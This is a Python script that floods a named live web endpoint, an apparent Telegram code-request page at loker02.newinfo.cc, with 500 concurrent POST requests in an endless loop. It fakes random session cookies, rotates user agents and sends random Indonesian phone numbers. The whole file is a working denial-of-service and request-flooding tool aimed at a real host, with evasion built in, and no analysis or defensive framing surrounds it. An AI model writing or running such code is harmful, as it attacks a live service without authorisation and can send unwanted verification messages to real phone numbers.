import requests
import concurrent.futures
import random
import time
import string
import json

# Base URL and headers (without the user-agent and cookie)
URL = 'http://loker02.newinfo.cc/request_telegram_code'
HEADERS = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'http://loker02.newinfo.cc',
    'Connection': 'keep-alive',
    'Referer': 'http://loker02.newinfo.cc/main',
    'Priority': 'u=0'
}

# User agents list for random selection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
    # Add more user agents here to diversify requests
]

def random_phone():
    # Generate random Indonesian phone numbers starting with +628
    return "+628" + "".join(random.choice(string.digits) for _ in range(9))

def random_cookie():
    # Generate random session cookie data
    session_id = ''.join(random.choices(string.ascii_letters + string.digits + '-._', k=64))
    return f'session=.eJwtysmOokAAANB_{session_id}'

def send_request():
    # Set a unique user-agent and cookie for each request
    headers = HEADERS.copy()
    headers['User-Agent'] = random.choice(USER_AGENTS)
    headers['Cookie'] = random_cookie()
    
    # Randomized phone number for JSON payload
    payload = {"phone": random_phone()}

    try:
        response = requests.post(URL, headers=headers, data=json.dumps(payload))
        if response.status_code == 200:
            print("Request sent successfully.")
        else:
            print(f"Request failed with status code {response.status_code}.")
    except Exception as e:
        print(f"Request failed due to an error: {e}")

def main():
    # Infinite loop to send requests continuously
    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
        while True:
            # Submit 500 concurrent requests
            futures = [executor.submit(send_request) for _ in range(500)]
            concurrent.futures.wait(futures)
            time.sleep(0.001)  # 1 millisecond delay

if __name__ == "__main__":
    main()
